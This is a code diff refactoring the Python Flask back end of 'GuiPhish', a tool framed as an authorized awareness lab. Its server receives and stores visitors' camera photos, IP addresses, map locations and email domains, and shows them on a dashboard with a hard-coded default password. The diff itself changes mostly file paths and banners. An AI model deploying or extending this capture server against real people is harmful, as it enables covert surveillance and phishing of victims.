@@ -6,6 +6,28 @@ import base64
 from datetime import datetime
 from flask import Flask, request, jsonify, send_file, redirect, session
 
+# ================= PATHS =================
+
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+ROOT_DIR = os.path.abspath(os.path.join(BASE_DIR, ".."))
+
+WEB_DIR = os.path.join(ROOT_DIR, "web")
+TEMPLATES_DIR = os.path.join(WEB_DIR, "templates")
+PAGES_DIR = os.path.join(WEB_DIR, "pages")
+DATA_DIR = os.path.join(ROOT_DIR, "data")
+
+LOGS_DIR = os.path.join(DATA_DIR, "logs")
+FOTOS_DIR = os.path.join(DATA_DIR, "fotos")
+RELATORIOS_DIR = os.path.join(DATA_DIR, "reports")
+SESSIONS_DIR = os.path.join(DATA_DIR, "sessions")
+
+PASTAS = [LOGS_DIR, FOTOS_DIR, RELATORIOS_DIR, SESSIONS_DIR]
+
+for pasta in PASTAS:
+    os.makedirs(pasta, exist_ok=True)
+
+EVENTOS_FILE = os.path.join(LOGS_DIR, "eventos.jsonl")
+
 # ================= CONFIG =================
 
 DASHBOARD_USER = os.environ.get("DASHBOARD_USER", "admin")
@@ -13,11 +35,6 @@ DASHBOARD_PASS = os.environ.get("DASHBOARD_PASS", "guiphish")
 
 app = Flask(__name__)
 app.secret_key = os.environ.get("APP_SECRET_KEY", "guiphish_dashboard_secret")
-
-PASTAS = ["logs", "fotos", "relatorios"]
-
-for pasta in PASTAS:
-    os.makedirs(pasta, exist_ok=True)
 
 # ================= CORES =================
 
@@ -46,92 +63,18 @@ f"""
         🐧 Running on Kali Linux
         CRIADO POR: Geovanni Andrade
 {RESET}
-""",
-
-f"""
-{RED}
-  ██████╗ ██╗   ██╗██╗██████╗ ██╗  ██╗██╗███████╗██╗  ██╗
- ██╔════╝ ██║   ██║██║██╔══██╗██║  ██║██║██╔════╝██║  ██║
- ██║  ███╗██║   ██║██║██████╔╝███████║██║███████╗███████║
- ██║   ██║██║   ██║██║██╔═══╝ ██╔══██║██║╚════██║██╔══██║
- ╚██████╔╝╚██████╔╝██║██║     ██║  ██║██║███████║██║  ██║
-  ╚═════╝  ╚═════╝ ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝
-{BLUE}
-        📊 Logs • Dashboard • Reports
-        🧠 Browser Permission Awareness
-        ⚠️ Authorized Lab Only
-{RESET}
-""",
-
-f"""
-{BLUE}
-   _____       _ _____  _     _     _
-  / ____|     (_)  __ \\| |   (_)   | |
- | |  __ _   _ _| |__) | |__  _ ___| |__
- | | |_ | | | | |  ___/| '_ \\| / __| '_ \\
- | |__| | |_| | | |    | | | | \\__ \\ | | |
-  \\_____|\\__,_|_|_|    |_| |_|_|___/_| |_|
-{RED}
-        🔐 GuiPhish Toolkit
-        📸 Camera • 🌍 Location • 📧 Email
-        📊 Dashboard Enabled
-{RESET}
-""",
-
-f"""
-{RED}
-   ▄████  █    ██  ██▓ ██▓███   ██░ ██
-  ██▒ ▀█▒ ██  ▓██▒▓██▒▓██░  ██▒▓██░ ██▒
- ▒██░▄▄▄░▓██  ▒██░▒██▒▓██░ ██▓▒▒██▀▀██░
- ░▓█  ██▓▓▓█  ░██░░██░▒██▄█▓▒ ▒░▓█ ░██
- ░▒▓███▀▒▒▒█████▓ ░██░▒██▒ ░  ░░▓█▒░██▓
-{BLUE}
-        🌍 Geolocation Awareness Lab
-        🛡️ Controlled Security Simulation
-        👤 Created by Geovanni Andrade
-{RESET}
-""",
-
-f"""
-{BLUE}
-╔══════════════════════════════════════════════════════╗
-║                  GUIPHISH LAB                       ║
-║        Browser Permission Awareness Toolkit          ║
-╚══════════════════════════════════════════════════════╝
-{RED}
-        📸 Camera Capture Simulation
-        🌍 Location Permission Simulation
-        📧 Email/Account Awareness
-        🧾 Reports • 📊 Dashboard • 🧹 Cleanup
-{RESET}
-""",
-
-f"""
-{RED}
-╔══════════════════════════════════════════════════════╗
-║                  GUIPHISH                           ║
-║             Security Awareness Platform              ║
-╚══════════════════════════════════════════════════════╝
-{BLUE}
-        🔐 Authorized Testing Only
-        📊 SOC-style Dashboard
-        🐧 Kali Linux Ready
-        CRIADO POR: Geovanni Andrade
-{RESET}
 """
 ]
 
 # ================= FUNÇÕES =================
 
 def ler_eventos():
-    caminho = "logs/eventos.jsonl"
-
-    if not os.path.exists(caminho):
+    if not os.path.exists(EVENTOS_FILE):
         return []
 
     eventos = []
 
-    with open(caminho, "r", encoding="utf-8") as f:
+    with open(EVENTOS_FILE, "r", encoding="utf-8") as f:
         for linha in f:
             try:
                 eventos.append(json.loads(linha))
@@ -158,12 +101,6 @@ def mostrar_logs():
             f"IP: {evento.get('ip')}"
         )
 
-        if evento.get("google_maps") not in [None, "N/A"]:
-            print(f"  🌍 Maps: {evento.get('google_maps')}")
-
-        if evento.get("email_domain") not in [None, "N/A"]:
-            print(f"  📧 Domínio: {evento.get('email_domain')}")
-
     print("")
 
 
@@ -171,14 +108,17 @@ def gerar_relatorio():
     eventos = ler_eventos()
 
     fotos = []
-    if os.path.exists("fotos"):
-        fotos = [f for f in os.listdir("fotos") if f.endswith(".jpg")]
+    if os.path.exists(FOTOS_DIR):
+        fotos = [f for f in os.listdir(FOTOS_DIR) if f.endswith(".jpg")]
 
     total_camera = len([e for e in eventos if e.get("tipo") == "camera"])
     total_localizacao = len([e for e in eventos if e.get("tipo") == "localizacao"])
     total_email = len([e for e in eventos if e.get("tipo") == "email"])
 
-    nome = f"relatorios/relatorio_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+    nome = os.path.join(
+        RELATORIOS_DIR,
+        f"relatorio_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+    )
 
     with open(nome, "w", encoding="utf-8") as f:
         f.write("GuiPhish Awareness Lab - Relatório\n")
@@ -198,7 +138,7 @@ def gerar_relatorio():
 
 
 def limpar_evidencias():
-    confirmacao = input(f"\n{RED}[!] Apagar fotos, logs e relatórios locais? Digite SIM para confirmar: {RESET}")
+    confirmacao = input(f"\n{RED}[!] Apagar dados locais? Digite SIM para confirmar: {RESET}")
 
     if confirmacao != "SIM":
         print(f"{YELLOW}[+] Operação cancelada.{RESET}\n")
@@ -232,12 +172,17 @@ def autenticado():
 
 @app.route("/")
 def index():
-    return send_file("index.html")
+    return send_file(os.path.join(TEMPLATES_DIR, "camera-check", "index.html"))
 
 
 @app.route("/email")
 def email():
-    return send_file("email.html")
+    return send_file(os.path.join(TEMPLATES_DIR, "email-check", "index.html"))
+
+
+@app.route("/awareness")
+def awareness():
+    return send_file(os.path.join(PAGES_DIR, "awareness.html"))
 
 
 @app.route("/foto/<nome>")
@@ -246,7 +191,7 @@ def foto(nome):
         return redirect("/login")
 
     nome_seguro = os.path.basename(nome)
-    caminho = os.path.join("fotos", nome_seguro)
+    caminho = os.path.join(FOTOS_DIR, nome_seguro)
 
     if not os.path.exists(caminho):
         return "Foto não encontrada", 404
@@ -354,8 +299,8 @@ def dashboard():
     eventos = ler_eventos()
     fotos = []
 
-    if os.path.exists("fotos"):
-        fotos = sorted([f for f in os.listdir("fotos") if f.endswith(".jpg")], reverse=True)
+    if os.path.exists(FOTOS_DIR):
+        fotos = sorted([f for f in os.listdir(FOTOS_DIR) if f.endswith(".jpg")], reverse=True)
 
     total_camera = len([e for e in eventos if e.get("tipo") == "camera"])
     total_localizacao = len([e for e in eventos if e.get("tipo") == "localizacao"])
@@ -365,13 +310,13 @@ def dashboard():
 
     for e in eventos[-30:][::-1]:
         maps = ""
-        email = ""
+        email_info = ""
 
         if e.get("google_maps") not in [None, "N/A"]:
             maps = f"<a href='{e.get('google_maps')}' target='_blank'>🌍 Google Maps</a>"
 
         if e.get("email_domain") not in [None, "N/A"]:
-            email = f"<span>📧 {e.get('email_domain')}</span>"
+            email_info = f"<span>📧 {e.get('email_domain')}</span>"
 
         ultimos_eventos_html += f"""
         <tr>
@@ -379,7 +324,7 @@ def dashboard():
             <td>{e.get('tipo')}</td>
             <td>{e.get('status')}</td>
             <td>{e.get('ip')}</td>
-            <td>{maps} {email}</td>
+            <td>{maps} {email_info}</td>
         </tr>
         """
 
@@ -443,7 +388,6 @@ button, .btn {{
     border: 1px solid #1f2937;
     border-radius: 14px;
     padding: 20px;
-    box-shadow: 0 0 18px rgba(56,189,248,0.08), 0 0 18px rgba(239,68,68,0.08);
 }}
 .card h2 {{
     margin: 0;
@@ -610,16 +554,10 @@ def evento():
         "email_domain": data.get("email_domain", "N/A")
     }
 
-    with open("logs/eventos.jsonl", "a", encoding="utf-8") as f:
+    with open(EVENTOS_FILE, "a", encoding="utf-8") as f:
         f.write(json.dumps(evento_log, ensure_ascii=False) + "\n")
 
     print(f"\n{GREEN}[+] EVENTO REGISTRADO:{RESET} {tipo} | {evento_log['status']} | IP: {request.remote_addr}")
-
-    if evento_log["google_maps"] != "N/A":
-        print(f"{BLUE}[+] Google Maps:{RESET} {evento_log['google_maps']}")
-
-    if tipo == "email":
-        print(f"{CYAN}[+] Domínio informado:{RESET} {evento_log['email_domain']}")
 
     return jsonify({"ok": True})
 
@@ -636,14 +574,15 @@ def capture():
         img = data.get("image").split(",")[1]
         img_bytes = base64.b64decode(img)
 
-        nome = f"fotos/{datetime.now().strftime('%Y%m%d_%H%M%S_%f')}.jpg"
+        nome_arquivo = f"{datetime.now().strftime('%Y%m%d_%H%M%S_%f')}.jpg"
+        caminho = os.path.join(FOTOS_DIR, nome_arquivo)
 
-        with open(nome, "wb") as f:
+        with open(caminho, "wb") as f:
             f.write(img_bytes)
 
-        print(f"{GREEN}[+] FOTO SALVA:{RESET} {nome}")
+        print(f"{GREEN}[+] FOTO SALVA:{RESET} {caminho}")
 
-        return jsonify({"ok": True, "arquivo": nome})
+        return jsonify({"ok": True, "arquivo": nome_arquivo})
 
     except Exception as e:
         print(f"{RED}[-] Erro ao salvar foto:{RESET} {e}")
@@ -660,17 +599,17 @@ if __name__ == "__main__":
 
         if escolha == "1":
             print(f"\n{GREEN}[+] Modo câmera ativo. Iniciando Flask...{RESET}")
-            print("[+] Use o link principal do Cloudflared.\n")
+            print("[+] URL principal: /")
             break
 
         elif escolha == "2":
             print(f"\n{GREEN}[+] Modo localização ativo. Iniciando Flask...{RESET}")
-            print("[+] Use o link principal do Cloudflared.\n")
+            print("[+] URL principal: /")
             break
 
         elif escolha == "3":
             print(f"\n{GREEN}[+] Dashboard disponível em:{RESET}")
-            print("    https://SEU-LINK.trycloudflare.com/login")
+            print("    /login")
             print("[+] Login padrão:")
             print(f"    usuário: {DASHBOARD_USER}")
             print(f"    senha: {DASHBOARD_PASS}\n")
@@ -684,7 +623,7 @@ if __name__ == "__main__":
 
         elif escolha == "6":
             print(f"\n{GREEN}[+] Página de e-mail disponível em:{RESET}")
-            print("    https://SEU-LINK.trycloudflare.com/email\n")
+            print("    /email\n")
             break
 
         elif escolha == "7":
